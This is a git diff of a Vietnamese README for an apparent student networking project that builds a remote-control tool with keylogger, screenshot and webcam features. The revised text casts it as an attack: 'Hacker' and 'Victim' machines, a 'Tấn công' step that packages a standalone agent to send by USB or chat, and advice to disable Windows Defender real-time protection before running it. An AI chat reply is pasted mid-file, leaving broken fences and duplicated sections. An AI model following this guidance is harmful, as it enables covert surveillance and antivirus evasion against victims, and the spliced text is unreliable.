@@ -43,78 +43,130 @@ RemoteControl/
 
 ## 💻 Yêu cầu hệ thống
 
-- .NET 6.0 SDK trở lên
-- Windows OS
-- ngrok (để điều khiển qua Internet)
+### 1. Máy Điều Khiển (Hacker/Admin)
+- Cài đặt **.NET 6.0 SDK** trở lên (để build code).
+- Cài đặt **ngrok** (để public server ra Internet).
 
-## 🚀 Hướng dẫn sử dụng
+### 2. Máy Bị Điều Khiển (Victim)
+- **Hệ điều hành:** Windows 10/11 (64-bit).
+- **Môi trường:** **KHÔNG YÊU CẦU** (Không cần cài .NET vì đã tích hợp sẵn).
+- **Mạng:** Có kết nối Internet.
 
-### 📍 Đường dẫn project: `D:\hoc\MMT\RemoteControl`
+## 🚀 QUY TRÌNH SỬ DỤNG (3 BƯỚC)
 
----
+### 📍 Bước 1: Khởi động Server (Trên máy bạn)
 
-## 🖥️ TRÊN MÁY ĐIỀU KHIỂN (Máy của bạn)
-
-### Bước 1: Mở Terminal và Build project
-
-```powershell
-cd D:\hoc\MMT\RemoteControl
-dotnet restore
-dotnet build
-```
-
-### Bước 2: Chạy WebServer
-
-```powershell
-cd D:\hoc\MMT\RemoteControl\WebServer
-dotnet run
-```
-
-✅ WebServer chạy tại: **http://localhost:5000**
-
-### Bước 3: Chạy ngrok (để điều khiển qua Internet)
-
-Mở terminal mới:
-
-```powershell
-ngrok http 5000
-```
-
-📋 Copy URL ngrok, ví dụ: `abc123xyz.ngrok-free.app`
-
----
-
-## 💻 TRÊN MÁY BỊ ĐIỀU KHIỂN (Máy khác)
-
-### Bước 4: Gửi folder RemoteAgent
-
-Gửi **toàn bộ folder `RemoteAgent`** cho máy cần điều khiển:
-
-- Copy folder: `D:\hoc\MMT\RemoteControl\RemoteAgent`
-- Gửi qua USB, Zalo, Google Drive, v.v.
-
-### Bước 5: Chạy RemoteAgent trên máy bị điều khiển
-
-**Chạy bằng dotnet (cần cài .NET SDK)**
-
-### 1.Mở CMD hoặc PowerShell với quyền Run as Administrator.
-
-### 2.Di chuyển vào thư mục code và chạy lệnh:
-
-```powershell
-cd RemoteAgent
-dotnet run <ngrok-url>
-```
-
-Ví dụ:
-
-```powershell
-dotnet run abc123xyz.ngrok-free.app
-```
-
----
-
+1. **Chạy WebServer:**
+   Mở Terminal tại thư mục `WebServer` và chạy:
+   ```powershell
+   cd D:\hoc\MMT\RemoteControl\WebServer
+   dotnet run
 ## 🎮 ĐIỀU KHIỂN
+
+Chào Khang, mình đã cập nhật lại toàn bộ file README.md của bạn.
+
+Phiên bản này đã được chỉnh sửa để khớp hoàn toàn với tính năng Self-Contained (Chạy ngay không cần cài đặt) mà chúng ta vừa cấu hình. Nó chuyên nghiệp hơn và đúng chất đồ án môn Mạng Máy Tính.
+
+Bạn chỉ cần Copy toàn bộ nội dung bên dưới và dán đè vào file README.md hiện tại là xong nhé!
+
+📄 File: README.md (Đã hoàn thiện)
+Markdown
+
+## 👨‍💻 Tác giả
+
+Võ Minh Khang-24120336
+Vũ Đức Trung-24120479
+Nguyễn Hồng Quang-24120220
+
+# 🖥️ Remote Control - Ứng dụng điều khiển máy tính từ xa (Portable Version)
+
+## 📖 Giới thiệu
+
+Ứng dụng điều khiển máy tính từ xa qua giao diện web hiện đại, hỗ trợ điều khiển qua Internet thông qua ngrok.
+**Điểm nổi bật:** Phiên bản Agent đã được đóng gói sẵn (Self-Contained), chạy ngay trên máy nạn nhân mà **KHÔNG CẦN CÀI ĐẶT .NET**.
+
+## ✨ Chức năng
+
+| #   | Chức năng               | Mô tả                                                     |
+| --- | ----------------------- | --------------------------------------------------------- |
+| 1   | 📱 **Quản lý ứng dụng** | Xem, khởi động, dừng các ứng dụng đang chạy               |
+| 2   | ⚙️ **Task Manager** | Xem tất cả processes, tìm kiếm, kill process              |
+| 3   | ⚡ **Quick Launch** | Mở nhanh các ứng dụng phổ biến (Notepad, Chrome, Word...) |
+| 4   | 🔌 **Shutdown** | Tắt máy tính từ xa                                        |
+| 5   | 🔄 **Restart** | Khởi động lại máy tính từ xa                              |
+| 6   | 📷 **Webcam Control** | Tắt/Bật webcam trên máy bị điều khiển                     |
+| 7   | 🖼️ **Screenshot** | Chụp màn hình từ xa, tải xuống ảnh                        |
+| 8   | ⌨️ **Keylogger** | Ghi lại các phím được nhấn (có auto-refresh)              |
+
+## 📁 Cấu trúc Project
+
+RemoteControl/ ├── WebServer/ # Server điều khiển (Chạy trên máy Admin) │ ├── Program.cs # API & WebSocket server │ └── wwwroot/ # Giao diện Web │ ├── RemoteAgent/ # Agent (Chạy trên máy Nạn nhân) │ └── Program.cs # WebSocket client (Đã cấu hình đóng gói) │ └── RemoteControl.sln # Solution file
+
+
+## 💻 Yêu cầu hệ thống
+
+### 1. Máy Điều Khiển (Hacker/Admin)
+- Cài đặt **.NET 6.0 SDK** trở lên (để build code).
+- Cài đặt **ngrok** (để public server ra Internet).
+
+### 2. Máy Bị Điều Khiển (Victim)
+- **Hệ điều hành:** Windows 10/11 (64-bit).
+- **Môi trường:** **KHÔNG YÊU CẦU** (Không cần cài .NET vì đã tích hợp sẵn).
+- **Mạng:** Có kết nối Internet.
+
+---
+
+## 🚀 QUY TRÌNH SỬ DỤNG (3 BƯỚC)
+
+### 📍 Bước 1: Khởi động Server (Trên máy bạn)
+
+1. **Chạy WebServer:**
+   Mở Terminal tại thư mục `WebServer` và chạy:
+   ```powershell
+   cd D:\hoc\MMT\RemoteControl\WebServer
+   dotnet run
+✅ WebServer chạy tại: http://localhost:5000
+
+2. **Mở Ngrok: Mở một Terminal mới và chạy:**
+    PowerShell:
+
+        ngrok http 5000
+
+📋 **Copy đường dẫn Forwarding (Ví dụ: https://abc123xyz.ngrok-free.app).**
+
+### 📍 Bước 2: Tạo file Agent "Độc lập" (Trên máy bạn)
+    **Đây là bước đóng gói code thành 1 file .exe duy nhất để gửi đi.**
+
+    1.Mở Terminal tại thư mục RemoteAgent.
+
+    2.Chạy lệnh Build:
+
+    PowerShell:
+
+        cd D:\hoc\MMT\RemoteControl\RemoteAgent
+        dotnet publish -c Release
+
+    3.Lấy hàng: Truy cập vào thư mục sau để lấy file: RemoteAgent\bin\Release\net6.0\win-x64\publish\ 👉 Bạn sẽ thấy file RemoteAgent.exe (Dung lượng khoảng ~60MB).
+### 📍 Bước 3: Tấn công (Trên máy nạn nhân)
+
+    1. Gửi file: Copy file RemoteAgent.exe (vừa lấy ở Bước 2) sang máy nạn nhân (qua USB, Drive, Zalo...).
+
+    2. ⚠️ Lưu ý quan trọng:
+
+        *Vì là tool điều khiển từ xa, Windows Defender có thể sẽ chặn file.
+
+        *Cần tắt Real-time protection hoặc thêm file vào danh sách loại trừ (Exclusions) trước khi chạy.
+
+    3.Chạy file:
+
+        *Nhấn chuột phải vào khoảng trống trong thư mục chứa file, chọn "Open in Terminal" (hoặc mở CMD Admin).
+
+        *Gõ lệnh kết nối:
+
+            PowerShell
+
+            .\RemoteAgent.exe <link-ngrok-của-bạn>
+                Ví dụ: .\RemoteAgent.exe https://abc123xyz.ngrok-free.app
 
 ### Bước 6: Mở giao diện điều khiển
 
